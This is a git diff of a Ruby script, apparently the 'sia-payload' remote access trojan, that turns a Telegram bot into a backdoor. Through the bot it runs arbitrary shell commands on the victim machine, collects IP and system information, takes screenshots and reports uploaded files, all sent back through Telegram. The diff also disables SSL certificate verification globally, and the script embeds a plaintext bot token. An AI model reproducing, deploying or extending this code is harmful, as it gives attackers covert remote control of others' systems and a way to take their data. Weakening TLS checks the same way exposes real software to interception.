@@ -5,8 +5,11 @@
 require "telegram/bot"
 require "cloudinary"
 require "json"
+require "openssl"
 
-$TOKEN = "304212840:AAHTNXoYw97LbyPbQL1F-su5mQKek7_neJo" 
+OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE
+
+$TOKEN = "304212840:AAHTNXoYw97LbyPbQL1F-su5mQKek7_neJo"
 
 Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
     begin
@@ -15,13 +18,13 @@ Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
             case message.text
             when '/start'
                 bot.api.send_message(chat_id: message.chat.id, text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\n\nEnter /help to see commands!")
-            
+
             #Help command
             when '/help'
                 help = """Help:
     /info => To Get ip and system info
     /screenShot => Get ScreenShot of system
-    
+
 for run shell command just send without `/` and \nRecive result.
 
 Coded By : ViRuS007
@@ -66,7 +69,7 @@ Github: http://github.com/shayanzare/sia-payload
                     #send result to telegram bot
                     bot.api.send_message(chat_id: message.chat.id, text: "[+] File Succesful Uploaded!\nURLs : \n#{s}")
                 end
-            
+
             #Get other command
             else
                 command = message.text
@@ -74,7 +77,7 @@ Github: http://github.com/shayanzare/sia-payload
                 bot.api.sendMessage(chat_id: message.chat.id, text: "[+] Result :\n\n#{result}")
         end
     end
-    rescue 
+    rescue
         puts "Error"
         retry
     end
